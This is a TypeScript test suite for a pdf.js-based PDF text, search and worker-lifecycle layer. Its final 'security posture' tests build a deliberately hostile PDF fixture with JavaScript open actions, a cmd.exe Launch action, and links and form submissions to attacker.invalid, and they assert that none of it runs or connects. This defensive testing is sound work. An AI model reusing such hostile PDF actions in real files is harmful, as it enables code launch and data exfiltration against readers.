import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import net from 'node:net';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { PDFWorker, getDocument } from 'pdfjs-dist';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { configurePdfResources } from './worker';
import { isTextSearchable, openPdf, PdfError, setPdfWorkerFactory } from './document';
import type { PdfHandle } from './document';
import { buildTextIndex, extractRefCandidates, findText, normalizeToken } from './search';
import { buildPdfFixture, md5Digest, rc4Encryption } from './pdf-fixture';

// Wraps the real getDocument so the security tests can inspect exactly what this layer hands to pdf.js.
vi.mock('pdfjs-dist', async importOriginal => {
  const actual = await importOriginal<typeof import('pdfjs-dist')>();
  return { ...actual, getDocument: vi.fn((...args: Parameters<typeof actual.getDocument>) => actual.getDocument(...args)) };
});

// pdf.js in Node: no Web Worker, so the (fake) worker module is imported from a file URL, and the
// Node binary-data factory reads CMaps/fonts with fs.readFile(base + filename), hence plain paths.
// The legacy worker build is required: the modern one calls Uint8Array#toHex (Chromium 140+, not Node 24).
const require = createRequire(import.meta.url);
const pdfjsRoot = path.dirname(require.resolve('pdfjs-dist/package.json'));
const folder = (name: string) => `${path.join(pdfjsRoot, name).replace(/\\/g, '/')}/`; // pdf.js insists on a trailing "/"
configurePdfResources({
  workerSrc: pathToFileURL(path.join(pdfjsRoot, 'legacy', 'build', 'pdf.worker.mjs')).href,
  cMapUrl: folder('cmaps'), standardFontDataUrl: folder('standard_fonts'), wasmUrl: folder('wasm'), iccUrl: folder('iccs'),
});

async function withPdf<T>(data: Uint8Array, run: (handle: PdfHandle) => Promise<T>, options?: Parameters<typeof openPdf>[1]): Promise<T> {
  const handle = await openPdf(data, options);
  try { return await run(handle); } finally { await handle.destroy(); }
}

const failure = async (promise: Promise<unknown>): Promise<PdfError> => {
  try { await promise; } catch (error) { expect(error).toBeInstanceOf(PdfError); return error as PdfError; }
  throw new Error('expected rejection');
};

// Page 1: three separate tokens on one baseline, a sentence, and distractors for exact matching.
const textPage = {
  texts: [
    { x: 72, y: 700, text: 'PU301' }, { x: 200, y: 700, text: 'GND' }, { x: 300, y: 700, text: '3.3V' },
    { x: 72, y: 650, text: 'PU301 GND 3.3V' },
    { x: 72, y: 600, text: 'PU3011 drives (PU301) from +3.3V; see PU301.' },
    { x: 72, y: 560, text: 'R12 C7 D+/D-' },
  ],
};
const vectorPdf = buildPdfFixture({ pages: [textPage] });
const mixedPdf = buildPdfFixture({ pages: [textPage, { image: true }] });
const scanPdf = buildPdfFixture({ pages: [{ image: true }] });

describe('pdf document layer (pdf.js in Node)', () => {
  it('opens a vector PDF, reports the page size and positions text items top-left/Y-down', async () => {
    await withPdf(vectorPdf, async handle => {
      expect(handle.pageCount).toBe(1);
      expect(await handle.getPageSize(1)).toEqual({ width: 612, height: 792, rotation: 0 });
      const items = await handle.getTextItems(1);
      expect(items.length).toBeGreaterThanOrEqual(4);
      const baseline = 792 - 700;
      const line = items.filter(item => Math.abs(item.y + item.height - baseline) < 3).sort((a, b) => a.x - b.x);
      expect(line.map(item => item.str)).toEqual(['PU301', 'GND', '3.3V']);
      expect(line.map(item => Math.round(item.x))).toEqual([72, 200, 300]);
      for (let i = 1; i < line.length; i++) expect(line[i].x).toBeGreaterThan(line[i - 1].x + line[i - 1].width);
      // Helvetica 12 pt: "PU301" advances 3057/1000 * 12 = 36.7 pt; the box is one font size high.
      expect(line[0].width).toBeGreaterThan(30); expect(line[0].width).toBeLessThan(44);
      expect(line[0].height).toBeGreaterThan(10); expect(line[0].height).toBeLessThan(14);
      expect(items.every(item => item.page === 1 && item.x >= 0 && item.y >= 0 && item.x + item.width <= 612 && item.y + item.height <= 792)).toBe(true);
      expect(await handle.getTextItems(1)).toBe(items); // LRU cache returns the same array
    });
  });

  it('ignores the page /Rotate for text coordinates and reports it separately', async () => {
    const rotated = buildPdfFixture({ pages: [{ ...textPage, rotate: 90 }] });
    await withPdf(rotated, async handle => {
      expect(await handle.getPageSize(1)).toEqual({ width: 612, height: 792, rotation: 90 });
      const item = (await handle.getTextItems(1)).find(entry => entry.str === 'GND')!;
      expect(Math.round(item.x)).toBe(200);
      expect(Math.round(item.y + item.height)).toBe(92);
    });
  });

  it('finds text, extracts exact reference and net candidates and reports duplicates as separate hits', async () => {
    await withPdf(vectorPdf, async handle => {
      const progress: number[] = [];
      const index = await buildTextIndex(handle, { onProgress: page => progress.push(page) });
      expect(progress).toEqual([1]);
      expect(index.truncated).toBe(false);
      expect(index.pageStarts).toEqual([0, index.items.length]);

      const hits = findText(index, 'pu301');
      expect(hits.length).toBe(5); // PU301, "PU301 GND 3.3V", PU3011, (PU301), PU301.
      expect(hits.every(hit => hit.page === 1 && hit.width > 0 && hit.height > 0 && hit.context.toUpperCase().includes('PU301'))).toBe(true);
      expect(findText(index, 'PU301', { wholeWord: true }).length).toBe(4);
      expect(findText(index, 'pu301', { caseSensitive: true })).toEqual([]);
      expect(findText(index, '   ')).toEqual([]);
      const partial = hits.find(hit => index.items[hit.itemIndex].str === 'PU301 GND 3.3V')!;
      expect(partial.x).toBeCloseTo(index.items[partial.itemIndex].x, 5);
      expect(partial.width).toBeLessThan(index.items[partial.itemIndex].width / 2);

      const candidates = extractRefCandidates(index, new Set(['PU301', 'PU30', 'R12', 'c7']), new Set(['GND', '3.3V', 'D+', 'D+/D-', 'VCC']));
      const byName = new Map(candidates.map(candidate => [candidate.name, candidate]));
      expect(byName.get('PU301')?.kind).toBe('ref');
      expect(byName.get('PU301')?.hits.length).toBe(4); // standalone, sentence, "(PU301)", "PU301." — never PU3011
      expect(byName.has('PU30')).toBe(false);
      expect(byName.get('GND')?.kind).toBe('net');
      expect(byName.get('GND')?.hits.length).toBe(2);
      expect(byName.get('3.3V')?.hits.length).toBe(2); // "+3.3V" is a different token and does not match
      expect(byName.get('R12')?.hits.length).toBe(1);
      expect(byName.get('c7')?.hits.length).toBe(1);
      expect(byName.get('D+')?.hits.length).toBe(1);
      expect(byName.get('D+/D-')?.hits.length).toBe(1);
      expect(byName.has('VCC')).toBe(false);
      const gnd = byName.get('GND')!.hits.find(hit => index.items[hit.itemIndex].str === 'PU301 GND 3.3V')!;
      expect(gnd.x).toBeGreaterThan(index.items[gnd.itemIndex].x);
    });
  });

  it('normalizes tokens by stripping surrounding punctuation only', () => {
    expect(normalizeToken(' (pu301) ')).toBe('PU301');
    expect(normalizeToken('gnd,')).toBe('GND');
    expect(normalizeToken('"+3.3V".')).toBe('+3.3V');
    expect(normalizeToken('~RESET')).toBe('~RESET');
    expect(normalizeToken('VDD_3.3')).toBe('VDD_3.3');
    expect(normalizeToken('a   b')).toBe('A B');
    expect(normalizeToken('...')).toBe('');
  });

  it('detects scan-only pages and documents', async () => {
    await withPdf(mixedPdf, async handle => {
      expect(handle.pageCount).toBe(2);
      expect(await handle.getTextItems(2)).toEqual([]);
      expect(await isTextSearchable(handle, { samplePages: 2 })).toEqual({ searchable: true, sampledPages: 2, itemsFound: (await handle.getTextItems(1)).length });
      const index = await buildTextIndex(handle);
      expect(index.indexedPages).toBe(2);
      expect(index.pageStarts).toEqual([0, index.items.length, index.items.length]);
    });
    await withPdf(scanPdf, async handle => {
      expect(await isTextSearchable(handle)).toEqual({ searchable: false, sampledPages: 1, itemsFound: 0 });
    });
  });

  it('flattens the bookmark outline to page numbers', async () => {
    const pdf = buildPdfFixture({
      pages: [textPage, { texts: [{ x: 72, y: 700, text: 'Regulators' }] }],
      outline: [{ title: 'Power', page: 1, children: [{ title: 'Regulators', page: 2 }] }, { title: 'Page two', page: 2 }],
    });
    await withPdf(pdf, async handle => {
      expect(await handle.getOutline()).toEqual([
        { title: 'Power', page: 1, depth: 0 }, { title: 'Regulators', page: 2, depth: 1 }, { title: 'Page two', page: 2, depth: 0 },
      ]);
    });
    await withPdf(vectorPdf, async handle => { expect(await handle.getOutline()).toEqual([]); });
  });

  it('rejects documents above the page limit, corrupted bytes and cancelled opens with structured errors', async () => {
    expect((await failure(openPdf(mixedPdf, { maxPages: 1 }))).code).toBe('LIMIT_EXCEEDED');
    expect((await failure(openPdf(new TextEncoder().encode('%PDF-1.4\nthis is not a pdf')))).code).toBe('INVALID_PDF');
    expect((await failure(openPdf(Uint8Array.from({ length: 4096 }, (_, i) => (i * 7919) & 255)))).code).toBe('INVALID_PDF');
    const controller = new AbortController();
    controller.abort();
    expect((await failure(openPdf(vectorPdf, { signal: controller.signal }))).code).toBe('ABORTED');
    const truncated = vectorPdf.slice(0, Math.floor(vectorPdf.length / 3));
    const error = await failure(openPdf(truncated).then(async handle => { await handle.getTextItems(1); await handle.destroy(); }))
      .catch(() => null);
    // pdf.js may repair a truncated file; either outcome is acceptable, but never an unstructured error.
    if (error) expect(['INVALID_PDF']).toContain(error.code);
  });

  it('does not detach the caller\'s bytes and rejects use after destroy', async () => {
    const copy = vectorPdf.slice();
    const handle = await openPdf(copy);
    expect(copy.byteLength).toBe(vectorPdf.byteLength);
    await handle.destroy();
    await handle.destroy();
    expect((await failure(handle.getTextItems(1))).code).toBe('DESTROYED');
  });

  it('cancels text indexing through the signal', async () => {
    await withPdf(mixedPdf, async handle => {
      const controller = new AbortController();
      const indexing = buildTextIndex(handle, { signal: controller.signal, onProgress: () => controller.abort() });
      expect((await failure(indexing)).code).toBe('ABORTED');
    });
  });

  it('maps standard-security-handler passwords to PASSWORD_REQUIRED / INVALID_PASSWORD and decrypts with the right one', async () => {
    const encrypted = buildPdfFixture({ pages: [textPage], encryption: rc4Encryption('secret') });
    expect((await failure(openPdf(encrypted))).code).toBe('PASSWORD_REQUIRED');
    expect((await failure(openPdf(encrypted, { password: 'wrong' }))).code).toBe('INVALID_PASSWORD');
    await withPdf(encrypted, async handle => {
      const items = await handle.getTextItems(1);
      expect(items.map(item => item.str)).toContain('PU301 GND 3.3V');
    }, { password: 'secret' });
  });
});

describe('fixture crypto helpers', () => {
  it('md5Digest matches node:crypto for block-boundary lengths', () => {
    for (const length of [0, 1, 55, 56, 63, 64, 65, 119, 120, 1000]) {
      const data = Uint8Array.from({ length }, (_, i) => (i * 31 + 7) & 255);
      expect(Buffer.from(md5Digest(data)).toString('hex')).toBe(createHash('md5').update(data).digest('hex'));
    }
    expect(Buffer.from(md5Digest(new TextEncoder().encode('a'), new TextEncoder().encode('bc'))).toString('hex')).toBe('900150983cd24fb0d6963f7d28e17f72');
  });
});

// B31: a failed open used to leave its dedicated pdf.js worker alive. pdf.js workers are created through the factory seam,
// so every one of them can be inspected: after any settled open, only the workers of returned handles may be alive.
describe('pdf.js worker lifecycle (B31)', () => {
  const workers: PDFWorker[] = [];
  const live = () => workers.filter(worker => !worker.destroyed).length;
  beforeEach(() => {
    workers.length = 0;
    setPdfWorkerFactory(() => { const worker = new PDFWorker({ verbosity: 0 }); workers.push(worker); return worker; });
  });
  afterEach(() => { setPdfWorkerFactory(null); vi.useRealTimers(); });

  const invalid = new TextEncoder().encode('%PDF-1.4\nthis is not a pdf');

  it('destroys the worker of every failed open: invalid bytes, password required / wrong, page limit', async () => {
    expect((await failure(openPdf(invalid))).code).toBe('INVALID_PDF');
    expect((await failure(openPdf(invalid))).code).toBe('INVALID_PDF');
    expect((await failure(openPdf(new Uint8Array(0)))).code).toBe('INVALID_PDF');
    expect(workers.length).toBe(3);
    expect(live()).toBe(0);
    const encrypted = buildPdfFixture({ pages: [textPage], encryption: rc4Encryption('secret') });
    expect((await failure(openPdf(encrypted))).code).toBe('PASSWORD_REQUIRED');
    expect((await failure(openPdf(encrypted, { password: 'wrong' }))).code).toBe('INVALID_PASSWORD');
    expect((await failure(openPdf(mixedPdf, { maxPages: 1 }))).code).toBe('LIMIT_EXCEEDED');
    expect(workers.length).toBe(6);
    expect(live()).toBe(0);
  });

  it('destroys the worker when the open is aborted before, during or right after the load', async () => {
    const early = new AbortController();
    early.abort();
    expect((await failure(openPdf(vectorPdf, { signal: early.signal }))).code).toBe('ABORTED');
    expect(workers.length).toBe(0); // nothing is started for an already-aborted signal

    const during = new AbortController();
    const opening = openPdf(vectorPdf, { signal: during.signal });
    during.abort();
    expect((await failure(opening)).code).toBe('ABORTED');
    expect(live()).toBe(0);

    const late = new AbortController();
    const finishing = openPdf(vectorPdf, { signal: late.signal });
    await new Promise(resolve => setTimeout(resolve, 20)); // usually loaded by now; either outcome must leave nothing behind
    late.abort();
    await finishing.then(handle => handle.destroy(), () => {});
    expect(live()).toBe(0);
  });

  it('keeps exactly the worker of a successful open until destroy, and earlier failures do not resurface', async () => {
    await failure(openPdf(invalid));
    await failure(openPdf(invalid));
    const handle = await openPdf(vectorPdf);
    expect(workers.length).toBe(3);
    expect(live()).toBe(1);
    await handle.getTextItems(1);
    await handle.destroy();
    await handle.destroy();
    expect(live()).toBe(0);
  });

  it('never lets a failing worker teardown mask the reported error', async () => {
    class FlakyWorker extends PDFWorker {
      override destroy(): void { super.destroy(); throw new Error('terminate failed'); }
    }
    setPdfWorkerFactory(() => { const worker = new FlakyWorker({ verbosity: 0 }); workers.push(worker); return worker; });
    expect((await failure(openPdf(invalid))).code).toBe('INVALID_PDF');
    expect(live()).toBe(0);
    const handle = await openPdf(vectorPdf);
    await expect(handle.destroy()).resolves.toBeUndefined();
    expect(live()).toBe(0);
  });

  it('settles an abort and destroys the worker even when pdf.js never answers (worker that never starts)', async () => {
    class StuckWorker extends PDFWorker {
      override get promise(): Promise<void> { return new Promise<void>(() => {}); }
    }
    setPdfWorkerFactory(() => { const worker = new StuckWorker({ verbosity: 0 }); workers.push(worker); return worker; });
    vi.useFakeTimers();
    const controller = new AbortController();
    const opening = openPdf(vectorPdf, { signal: controller.signal });
    const outcome = failure(opening);
    await vi.advanceTimersByTimeAsync(10);
    expect(live()).toBe(1);
    controller.abort();
    await vi.advanceTimersByTimeAsync(5001); // the bounded teardown gives up waiting for the handshake, then destroys the worker
    expect((await outcome).code).toBe('ABORTED');
    expect(live()).toBe(0);
  });

  it('reports DESTROYED (not a raw pdf.js error) for work in flight when the handle is destroyed', async () => {
    const handle = await openPdf(mixedPdf);
    const pending = handle.getTextItems(2).catch(error => error);
    const outline = handle.getOutline().catch(error => error);
    await handle.destroy();
    for (const outcome of [await pending, await outline]) {
      // Either the read finished before the teardown or it was cancelled with the structured code.
      if (outcome instanceof Error) expect((outcome as PdfError).code).toBe('DESTROYED');
    }
    expect((await failure(handle.getPageSize(1))).code).toBe('DESTROYED');
    expect((await failure(handle.getOutline())).code).toBe('DESTROYED');
  });

  it('shares one text extraction between concurrent callers of the same page', async () => {
    await withPdf(vectorPdf, async handle => {
      const [a, b] = await Promise.all([handle.getTextItems(1), handle.getTextItems(1)]);
      expect(a).toBe(b);
    });
  });
});

// Security posture of the document layer: bytes in, nothing out, no document code executed.
describe('security posture', () => {
  const hostile = buildPdfFixture({
    pages: [{
      texts: [{ x: 72, y: 700, text: 'PU301' }],
      annotations: [
        '/Type /Annot /Subtype /Link /Rect [72 690 120 712] /A << /S /URI /URI (https://attacker.invalid/uri) >>',
        '/Type /Annot /Subtype /Link /Rect [72 650 120 672] /A << /S /GoToR /F (https://attacker.invalid/remote.pdf) /D [0 /Fit] >>',
        '/Type /Annot /Subtype /Link /Rect [72 610 120 632] /A << /S /Launch /F (cmd.exe) >>',
        '/Type /Annot /Subtype /Link /Rect [72 570 120 592] /A << /S /JavaScript /JS (globalThis.__traceScript = "link") >>',
        '/Type /Annot /Subtype /Widget /FT /Btn /T (b) /Rect [72 530 120 552] /AA << /U << /S /JavaScript /JS (globalThis.__traceScript = "widget") >> >>',
        '/Type /Annot /Subtype /Widget /FT /Btn /T (c) /Rect [72 490 120 512] /A << /S /SubmitForm /F (https://attacker.invalid/submit) >>',
        '/Type /Annot /Subtype /Widget /FT /Btn /T (d) /Rect [72 450 120 472] /A << /S /ImportData /F (https://attacker.invalid/data.fdf) >>',
      ],
      pageExtra: '/AA << /O << /S /JavaScript /JS (globalThis.__traceScript = "page") >> >>',
    }],
    catalogExtra: '/OpenAction << /S /JavaScript /JS (globalThis.__traceScript = "open") >> /AA << /WC << /S /JavaScript /JS (globalThis.__traceScript = "close") >> >>'
      + ' /Names << /JavaScript << /Names [(init) << /S /JavaScript /JS (globalThis.__traceScript = "names") >>] >> >>',
  });

  it('hands pdf.js bytes only: no URL / range / header options, no auto-fetch, no XFA, no system fonts', async () => {
    const calls = vi.mocked(getDocument).mock.calls;
    const before = calls.length;
    const original = vectorPdf.slice();
    await withPdf(original, async () => {});
    expect(calls.length).toBe(before + 1);
    const params = calls[calls.length - 1][0] as unknown as Record<string, unknown>;
    // An allowlist: adding any option (url, range, httpHeaders, withCredentials, docBaseUrl, enableScripting, ...) must be a deliberate edit here.
    expect(Object.keys(params).sort()).toEqual(['cMapPacked', 'cMapUrl', 'data', 'disableAutoFetch', 'disableRange', 'disableStream', 'enableXfa',
      'iccUrl', 'password', 'standardFontDataUrl', 'useSystemFonts', 'verbosity', 'wasmUrl', 'worker']);
    expect(params.data).toBeInstanceOf(Uint8Array);
    expect((params.data as Uint8Array).buffer).not.toBe(original.buffer);
    expect(params).toMatchObject({ disableAutoFetch: true, disableStream: true, disableRange: true, enableXfa: false, useSystemFonts: false, verbosity: 0 });
    expect(params.worker).toBeInstanceOf(PDFWorker);
    for (const key of ['cMapUrl', 'standardFontDataUrl', 'wasmUrl', 'iccUrl']) expect(String(params[key])).not.toMatch(/^[a-z]+:\/\/(?!\/)/i); // bundled folders only, never a remote origin
  });

  it('never imports scripting, annotation-layer or link-following code from pdf.js', () => {
    const sources = ['document.ts', 'worker.ts', 'search.ts', 'session.ts'].map(name => readFileSync(path.join(import.meta.dirname, name), 'utf8')
      .replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')).join('\n');
    expect(sources).not.toMatch(/pdfjs-dist\/web|pdf\.sandbox|PDFScriptingManager|PDFLinkService|AnnotationLayer|enableScripting|\beval\s*\(|new Function|\bfetch\s*\(|XMLHttpRequest|WebSocket|window\.open|location\.(href|assign)/);
    expect(sources).not.toMatch(/\b(url|range|httpHeaders|withCredentials|docBaseUrl)\s*:/); // no loading-source option is ever set
  });

  it('opens a document full of scripts and external links without running or following any of it', async () => {
    const raw = new TextDecoder('latin1').decode(hostile);
    for (const marker of ['/OpenAction', '/S /JavaScript', '/S /URI', '/S /GoToR', '/S /Launch', '/S /SubmitForm', '/S /ImportData']) expect(raw).toContain(marker); // the fixture really is hostile
    const connect = vi.spyOn(net.Socket.prototype, 'connect');
    const fetchSpy = vi.spyOn(globalThis, 'fetch');
    const target = globalThis as { __traceScript?: string };
    delete target.__traceScript;
    try {
      await withPdf(hostile, async handle => {
        expect(handle.pageCount).toBe(1);
        expect((await handle.getTextItems(1)).map(item => item.str)).toEqual(['PU301']);
        expect(await handle.getOutline()).toEqual([]);
        expect(await handle.getPageSize(1)).toEqual({ width: 612, height: 792, rotation: 0 });
      });
      expect(target.__traceScript).toBeUndefined();
      expect(connect).not.toHaveBeenCalled();
      expect(fetchSpy).not.toHaveBeenCalled();
    } finally {
      connect.mockRestore();
      fetchSpy.mockRestore();
    }
  });
});
